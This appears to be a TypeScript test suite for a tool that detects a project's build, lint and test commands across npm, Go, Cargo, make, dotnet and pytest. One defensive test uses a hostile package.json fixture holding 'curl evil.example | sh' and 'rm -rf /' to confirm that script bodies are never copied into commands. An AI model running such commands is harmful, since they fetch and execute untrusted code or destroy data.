import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { join, relative } from 'node:path';
import { test, type TestContext } from 'node:test';
import { MAX_CHECK_COMMANDS, findChecks, type FindOptions } from '../src/projects/check-find.ts';
import { flagsFrom } from '../src/projects/diff-flags.ts';
import { removeDir } from './helpers.ts';

const ROOT = join(import.meta.dirname, '..');
type Tee = TestContext;

function scratch(t: Tee): string {
  mkdirSync(join(ROOT, 'tmp'), { recursive: true });
  const dir = mkdtempSync(join(ROOT, 'tmp', 'check-find-'));
  t.after(() => removeDir(dir));
  return dir;
}

function site(t: Tee, files: Record<string, string | null>): string {
  const dir = scratch(t);
  for (const [name, body] of Object.entries(files)) {
    const path = join(dir, name);
    if (body === null) { mkdirSync(path, { recursive: true }); continue; }
    mkdirSync(join(path, '..'), { recursive: true });
    writeFileSync(path, body);
  }
  return dir;
}

const pkg = (scripts: Record<string, string>, extra: Record<string, unknown> = {}): string => JSON.stringify({ name: 'p', scripts, ...extra });
const commandsOf = (root: string, options?: FindOptions): string[] => findChecks(root, options).commands.map(c => c.command);

function bin(t: Tee, names: string[], folder = 'bin'): FindOptions {
  const dir = join(scratch(t), folder);
  mkdirSync(dir, { recursive: true });
  for (const name of names) writeFileSync(join(dir, `${name}.exe`), '');
  return { env: { PATH: dir, PATHEXT: '.EXE' }, windows: true };
}

const NO_TOOLS: FindOptions = { env: { PATH: '' }, windows: true };

function tree(root: string): Record<string, string> {
  const out: Record<string, string> = {};
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const abs = join(dir, entry.name);
      if (entry.isDirectory()) { out[`${relative(root, abs)}/`] = String(statSync(abs).mtimeMs); walk(abs); }
      else out[relative(root, abs)] = `${statSync(abs).mtimeMs}:${createHash('sha256').update(readFileSync(abs)).digest('hex')}`;
    }
  };
  walk(root);
  return out;
}

test('find npm: 親玉の script（check → verify → ci の順）があれば、それ 1 つだけを選ぶ', t => {
  const all = { check: 'c', verify: 'v', ci: 'i', test: 'jest', build: 'tsc', lint: 'eslint .', typecheck: 'tsc --noEmit' };
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg(all) })), ['npm run check']);
  const { check: _check, ...noCheck } = all;
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg(noCheck) })), ['npm run verify']);
  const { verify: _verify, ...noVerify } = noCheck;
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg(noVerify) })), ['npm run ci']);
  const found = findChecks(site(t, { 'package.json': pkg(all) }));
  assert.equal(found.commands[0]?.source, 'package.json scripts.check');
  assert.equal(found.none, undefined);
  assert.equal(found.blocked, undefined);
});

test('find npm: 親玉が無ければ typecheck・lint・build・test のうち有るものをこの順に。dev・start・watch・serve は選ばない', t => {
  const scripts = { test: 'vitest run', serve: 's', build: 'tsc', watch: 'w', lint: 'eslint .', start: 'node .', typecheck: 'tsc --noEmit', dev: 'vite' };
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg(scripts) })), ['npm run typecheck', 'npm run lint', 'npm run build', 'npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ build: 'tsc', test: 'vitest run' }) })), ['npm run build', 'npm run test']);
  const server = findChecks(site(t, { 'package.json': pkg({ dev: 'vite', start: 'node .', watch: 'w', serve: 's' }) }));
  assert.deepEqual(server.commands, []);
  assert.ok(server.none);
});

test('find npm: type-check も型の確かめとして認め、typecheck があればそちらを使う', t => {
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ 'type-check': 'tsc', test: 'x' }) })), ['npm run type-check', 'npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ 'type-check': 'a', typecheck: 'b' }) })), ['npm run typecheck']);
});

test('find npm: npm の雛形の test（no test specified && exit 1）は数えない。本物の test は数える', t => {
  const placeholder = 'echo "Error: no test specified" && exit 1';
  const none = findChecks(site(t, { 'package.json': pkg({ test: placeholder }) }));
  assert.deepEqual(none.commands, []);
  assert.ok(none.none);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ test: placeholder, build: 'tsc' }) })), ['npm run build']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ test: 'echo "no tests yet" && exit 0' }) })), ['npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ test: 'node --test' }) })), ['npm run test']);
});

test('find npm: --fix か --write のある lint は選ばない（確かめの最中にファイルを書き換えるため）', t => {
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ lint: 'eslint . --fix', test: 'x' }) })), ['npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ lint: 'prettier --write .', test: 'x' }) })), ['npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ lint: 'eslint . --fix --cache', build: 'b' }) })), ['npm run build']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ lint: 'eslint .', test: 'x' }) })), ['npm run lint', 'npm run test']);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ lint: 'eslint --fix-dry-run .' }) })), ['npm run lint']);
});

test('find npm: 道具はロックファイルで決める（pnpm → yarn → bun → npm）', t => {
  const scripts = pkg({ test: 'x' });
  const cases: Array<[string[], string]> = [
    [['pnpm-lock.yaml'], 'pnpm run test'],
    [['yarn.lock'], 'yarn run test'],
    [['bun.lock'], 'bun run test'],
    [['bun.lockb'], 'bun run test'],
    [['package-lock.json'], 'npm run test'],
    [[], 'npm run test'],
    [['pnpm-lock.yaml', 'yarn.lock', 'package-lock.json'], 'pnpm run test'],
    [['yarn.lock', 'bun.lock'], 'yarn run test'],
  ];
  for (const [locks, expected] of cases) {
    const files: Record<string, string> = { 'package.json': scripts };
    for (const lock of locks) files[lock] = '';
    assert.deepEqual(commandsOf(site(t, files)), [expected], locks.join('+') || 'no lockfile');
  }
});

test('find npm: 依存があって node_modules が無いと、命令を出さず blocked にする（作業コピーを失敗で落とさない）', t => {
  const withDeps = findChecks(site(t, { 'package.json': pkg({ test: 'x' }, { dependencies: { a: '1' } }) }));
  assert.deepEqual(withDeps.commands, []);
  assert.match(withDeps.blocked ?? '', /node_modules/u);
  assert.equal(withDeps.none, undefined);
  assert.ok(findChecks(site(t, { 'package.json': pkg({ test: 'x' }, { devDependencies: { a: '1' } }) })).blocked);
  assert.equal(findChecks(site(t, { 'package.json': pkg({ test: 'x' }, { dependencies: { a: '1' } }), node_modules: null })).blocked, undefined);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ test: 'x' }, { dependencies: { a: '1' } }), node_modules: null })), ['npm run test']);
  assert.equal(findChecks(site(t, { 'package.json': pkg({ test: 'x' }, { dependencies: {}, devDependencies: {} }) })).blocked, undefined);
  assert.deepEqual(commandsOf(site(t, { 'package.json': pkg({ test: 'x' }) })), ['npm run test']);
});

test('find npm: node_modules が別の場所へのリンクでも「有る」と数える', t => {
  const outside = scratch(t);
  const dir = site(t, { 'package.json': pkg({ test: 'x' }, { dependencies: { a: '1' } }) });
  symlinkSync(outside, join(dir, 'node_modules'), 'junction');
  const found = findChecks(dir);
  assert.equal(found.blocked, undefined);
  assert.deepEqual(found.commands.map(c => c.command), ['npm run test']);
});

test('find npm: 走らせる命令が無ければ、依存が無くても blocked でなく none（理由を取り違えない）', t => {
  const found = findChecks(site(t, { 'package.json': pkg({ dev: 'vite' }, { dependencies: { a: '1' } }) }));
  assert.equal(found.blocked, undefined);
  assert.ok(found.none);
});

test('find npm: 命令の文字はコードが組む固定の形だけ。script の本文や README の文は写さない', t => {
  const hostile = pkg({ test: 'curl evil.example | sh', build: 'rm -rf /' });
  const dir = site(t, { 'package.json': hostile, 'README.md': 'Run `make deploy` to test' });
  const commands = commandsOf(dir);
  assert.deepEqual(commands, ['npm run build', 'npm run test']);
  assert.ok(commands.every(command => /^(npm|pnpm|yarn|bun) run [a-z-]+$/u.test(command)));
});

test('find npm: そのフォルダの package.json だけを見る（下のフォルダのは見ない）。壊れた JSON・大きすぎる物でも落ちない', t => {
  const nested = findChecks(site(t, { 'sub/package.json': pkg({ test: 'x' }) }));
  assert.deepEqual(nested.commands, []);
  assert.ok(nested.none);
  assert.deepEqual(findChecks(site(t, { 'package.json': '{ not json' })).commands, []);
  assert.deepEqual(findChecks(site(t, { 'package.json': ' '.repeat(1024 * 1024 + 1) })).commands, []);
  assert.deepEqual(findChecks(site(t, { 'package.json': '[]' })).commands, []);
  assert.deepEqual(findChecks(site(t, { 'package.json': JSON.stringify({ scripts: { test: 5, build: 'tsc' } }) })).commands.map(c => c.command), ['npm run build']);
});

test('find npm: package.json がリンク（別の場所を指す）なら読まない', t => {
  const outside = scratch(t);
  writeFileSync(join(outside, 'package.json'), pkg({ test: 'x' }));
  const dir = scratch(t);
  symlinkSync(outside, join(dir, 'package.json'), 'junction');
  assert.deepEqual(findChecks(dir).commands, []);
  const file = scratch(t);
  const target = join(outside, 'package.json');
  try { symlinkSync(target, join(file, 'package.json'), 'file'); } catch (error) {
    if ((error as NodeJS.ErrnoException).code === 'EPERM') { t.skip('file symlinks need a privilege on this host (the directory-link case above ran)'); return; }
    throw error;
  }
  assert.deepEqual(findChecks(file).commands, [], 'a symlinked package.json is not followed');
});

test('find go・cargo: go.mod は build・vet・test、Cargo.toml は build・test', t => {
  const go = findChecks(site(t, { 'go.mod': 'module x\n' }));
  assert.deepEqual(go.commands.map(c => c.command), ['go build ./...', 'go vet ./...', 'go test ./...']);
  assert.equal(go.commands[0]?.source, 'go.mod');
  const cargo = findChecks(site(t, { 'Cargo.toml': '[package]\nname = "x"\n' }));
  assert.deepEqual(cargo.commands.map(c => c.command), ['cargo build', 'cargo test']);
  assert.equal(cargo.commands[0]?.source, 'Cargo.toml');
});

test('find make: check の目的があれば make check、無ければ test があれば make test。make が PATH に有るときだけ', t => {
  const withMake = bin(t, ['make']);
  assert.deepEqual(commandsOf(site(t, { Makefile: 'build:\n\techo b\ncheck: build\n\techo c\ntest:\n\techo t\n' }), withMake), ['make check']);
  assert.deepEqual(commandsOf(site(t, { Makefile: 'build:\n\techo b\ntest:\n\techo t\n' }), withMake), ['make test']);
  assert.deepEqual(commandsOf(site(t, { GNUmakefile: 'test:\n\techo t\n' }), withMake), ['make test']);
  assert.deepEqual(commandsOf(site(t, { Makefile: 'all test check: x\n\techo\n' }), withMake), ['make check']);
  const noTarget = findChecks(site(t, { Makefile: '.PHONY: check test\nbuild:\n\techo b\n\techo check\nCHECK := 1\ncheck_all:\n\techo\n' }), withMake);
  assert.deepEqual(noTarget.commands, []);
  assert.ok(noTarget.none);
  const noMake = findChecks(site(t, { Makefile: 'check:\n\techo c\n' }), NO_TOOLS);
  assert.deepEqual(noMake.commands, []);
  assert.ok(noMake.none);
});

test('find dotnet: .sln がちょうど 1 つ、または .sln が無く .csproj がちょうど 1 つのときだけ dotnet build・test', t => {
  const expected = ['dotnet build', 'dotnet test'];
  assert.deepEqual(commandsOf(site(t, { 'App.sln': '' })), expected);
  assert.deepEqual(commandsOf(site(t, { 'App.csproj': '<Project/>' })), expected);
  assert.deepEqual(commandsOf(site(t, { 'App.sln': '', 'sub/Other.csproj': '<Project/>' })), expected);
  assert.deepEqual(commandsOf(site(t, { 'App.sln': '', 'Other.csproj': '<Project/>' })), [], 'dotnet stops with MSB1011 when the folder holds a solution and a project');
  assert.deepEqual(commandsOf(site(t, { 'App.csproj': '<Project/>', 'Lib.fsproj': '<Project/>' })), []);
  assert.deepEqual(commandsOf(site(t, { 'Lib.fsproj': '<Project/>' })), []);
  assert.deepEqual(commandsOf(site(t, { 'A.sln': '', 'B.sln': '' })), []);
  assert.deepEqual(commandsOf(site(t, { 'A.csproj': '', 'B.csproj': '' })), []);
  assert.deepEqual(commandsOf(site(t, { 'sub/App.csproj': '<Project/>' })), []);
  const two = findChecks(site(t, { 'A.sln': '', 'B.sln': '' }));
  assert.ok(two.none);
});

test('find python: pytest の設定（pyproject の [tool.pytest]・pytest.ini・tox.ini の [pytest]・setup.cfg の [tool:pytest]）があれば python -m pytest', t => {
  const python = bin(t, ['python']);
  const cases: Array<[string, Record<string, string>]> = [
    ['pyproject', { 'pyproject.toml': '[project]\nname = "x"\n\n[tool.pytest.ini_options]\naddopts = "-q"\n' }],
    ['pytest.ini', { 'pytest.ini': '' }],
    ['tox.ini', { 'tox.ini': '[tox]\nenvlist = py\n\n[pytest]\naddopts = -q\n' }],
    ['setup.cfg', { 'setup.cfg': '[metadata]\nname = x\n\n[tool:pytest]\naddopts = -q\n' }],
  ];
  for (const [label, files] of cases) assert.deepEqual(commandsOf(site(t, files), python), ['python -m pytest'], label);
  for (const files of [{ 'pyproject.toml': '[project]\nname = "x"\n' }, { 'setup.cfg': '[metadata]\nname = x\n' }, { 'tox.ini': '[tox]\nenvlist = py\n' }]) {
    const found = findChecks(site(t, files), python);
    assert.deepEqual(found.commands, [], JSON.stringify(files));
    assert.ok(found.none);
  }
});

test('find python: python が Windows の WindowsApps の入口なら選ばず、理由を none に書く。python が無いときも選ばない', t => {
  const stub = bin(t, ['python'], join('Microsoft', 'WindowsApps'));
  const folder = site(t, { 'pytest.ini': '' });
  const viaStub = findChecks(folder, stub);
  assert.deepEqual(viaStub.commands, []);
  assert.match(viaStub.none ?? '', /WindowsApps/u);
  const missing = findChecks(folder, NO_TOOLS);
  assert.deepEqual(missing.commands, []);
  assert.match(missing.none ?? '', /python/iu);
  assert.deepEqual(commandsOf(folder, bin(t, ['python'], join('Python314'))), ['python -m pytest']);
});

test('find 何も当たらない: commands は空で none に理由。blocked は付かない', t => {
  const found = findChecks(site(t, { 'index.html': '<p>hi</p>', 'README.md': 'npm test' }));
  assert.deepEqual(found.commands, []);
  assert.deepEqual(found.guards, []);
  assert.match(found.none ?? '', /package\.json/u);
  assert.equal(found.blocked, undefined);
  const missing = findChecks(join(scratch(t), 'does-not-exist'));
  assert.deepEqual(missing.commands, []);
  assert.ok(missing.none);
});

test('find 上限: 命令は最大 4 つ。上から順に当たった種類を並べ、あふれた種類は落とす', t => {
  assert.equal(MAX_CHECK_COMMANDS, 4);
  const full = findChecks(site(t, { 'package.json': pkg({ typecheck: 'a', lint: 'b', build: 'c', test: 'd' }), 'go.mod': 'module x\n', 'Cargo.toml': '' }));
  assert.deepEqual(full.commands.map(c => c.command), ['npm run typecheck', 'npm run lint', 'npm run build', 'npm run test']);
  const mixed = findChecks(site(t, { 'package.json': pkg({ check: 'a' }), 'go.mod': 'module x\n', 'App.sln': '', 'Directory.Build.props': '<Project/>' }));
  assert.deepEqual(mixed.commands.map(c => c.command), ['npm run check', 'go build ./...', 'go vet ./...', 'go test ./...']);
  assert.deepEqual(mixed.guards, ['package.json']);
  const cut = findChecks(site(t, { 'go.mod': 'module x\n', 'Cargo.toml': '', 'App.sln': '' }));
  assert.deepEqual(cut.commands.map(c => c.command), ['go build ./...', 'go vet ./...', 'go test ./...', 'cargo build']);
});

test('find guards: npm は package.json・.npmrc・tsconfig*.json・eslint の設定・vite.config.*・試験の設定。無い物・関係ない物は入れない。並びは名前順', t => {
  const dir = site(t, {
    'package.json': pkg({ test: 'x' }), '.npmrc': '', 'tsconfig.json': '{}', 'tsconfig.web.json': '{}', 'eslint.config.mjs': '', '.eslintrc.json': '{}', '.eslintrc': '{}',
    'vite.config.ts': '', 'vitest.config.ts': '', 'jest.config.js': '', 'README.md': '', 'src/vite.config.ts': '', 'Makefile': 'test:\n',
  });
  const found = findChecks(dir, bin(t, ['make']));
  assert.deepEqual(found.guards, ['.eslintrc', '.eslintrc.json', '.npmrc', 'Makefile', 'eslint.config.mjs', 'jest.config.js', 'package.json', 'tsconfig.json', 'tsconfig.web.json', 'vite.config.ts', 'vitest.config.ts']);
  assert.deepEqual(found.guards, [...found.guards].sort());
});

test('find guards: make は Makefile、python は pyproject.toml・pytest.ini・setup.cfg・tox.ini・conftest.py、dotnet は選んだ .sln と Directory.Build.props、go・cargo は試験の設定だけ', t => {
  const make = findChecks(site(t, { Makefile: 'test:\n', 'package.json': pkg({ dev: 'x' }), 'tsconfig.json': '{}' }), bin(t, ['make']));
  assert.deepEqual(make.guards, ['Makefile']);
  const py = findChecks(site(t, { 'pytest.ini': '', 'pyproject.toml': '[project]\n', 'setup.cfg': '', 'tox.ini': '', 'conftest.py': '', 'tsconfig.json': '{}' }), bin(t, ['python']));
  assert.deepEqual(py.guards, ['conftest.py', 'pyproject.toml', 'pytest.ini', 'setup.cfg', 'tox.ini']);
  const net = findChecks(site(t, { 'App.sln': '', 'Directory.Build.props': '<Project/>', 'tsconfig.json': '{}' }));
  assert.deepEqual(net.guards, ['App.sln', 'Directory.Build.props']);
  const go = findChecks(site(t, { 'go.mod': 'module x\n', 'jest.config.js': '', 'tsconfig.json': '{}', '.npmrc': '' }));
  assert.deepEqual(go.guards, ['jest.config.js']);
  const cargo = findChecks(site(t, { 'Cargo.toml': '', 'vitest.config.ts': '', 'tsconfig.json': '{}' }));
  assert.deepEqual(cargo.guards, ['vitest.config.ts']);
});

test('find guards: 試験の設定の名前の一覧は diff-flags の CHECK_CONFIG と同じ答えになる', t => {
  const names = [
    'jest.config.js', 'jest.config.ts', 'vitest.config.ts', 'vitest.workspace.ts', 'playwright.config.ts', 'cypress.config.js', 'karma.config.js', 'ava.config.js', 'babel.config.json',
    'karma.conf.js', '.mocharc.json', '.mocharc', '.c8rc.json', '.nycrc', '.nycrc.json', 'pytest.ini', 'conftest.py', 'tox.ini', 'noxfile.py', 'phpunit.xml', 'phpunit.xml.dist',
    'README.md', 'jest.js', 'config.js', 'tsconfig.json', 'jest.config', 'notjest.config.js',
  ];
  const files: Record<string, string> = { 'go.mod': 'module x\n' };
  for (const name of names) files[name] = '';
  const dir = site(t, files);
  const guarded = new Set(findChecks(dir).guards);
  for (const name of names) {
    const theirs = flagsFrom([{ status: 'M', path: name }], null, () => []).checkChanged.length > 0;
    assert.equal(guarded.has(name), theirs, name);
  }
});

test('find は読むだけ: 呼んでもフォルダの中身も更新時刻も変わらない', t => {
  const dir = site(t, { 'package.json': pkg({ check: 'x' }, { dependencies: { a: '1' } }), 'go.mod': 'module x\n', Makefile: 'test:\n', 'sub/a.txt': 'a' });
  const before = tree(dir);
  findChecks(dir, bin(t, ['make']));
  findChecks(dir);
  assert.deepEqual(tree(dir), before);
});
